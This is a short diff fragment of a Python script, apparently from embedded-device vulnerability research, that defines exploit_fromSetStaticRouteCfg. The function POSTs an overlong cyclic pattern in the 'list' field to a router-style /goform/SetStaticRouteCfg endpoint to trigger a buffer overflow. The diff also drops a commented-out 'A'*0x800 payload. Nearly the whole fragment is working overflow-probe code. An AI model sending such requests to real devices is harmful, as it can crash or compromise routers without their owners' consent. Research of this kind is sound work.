@@ -9,7 +9,6 @@ cyclic3 = b"111,222,333,aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa
 def exploit_fromSetStaticRouteCfg():
     url = f"http://{host}/goform/SetStaticRouteCfg"
     data = {
-        # b"shareSpeed":b'A'*0x800
         b'list':cyclic3
     }
     res = requests.post(url=url,data=data)
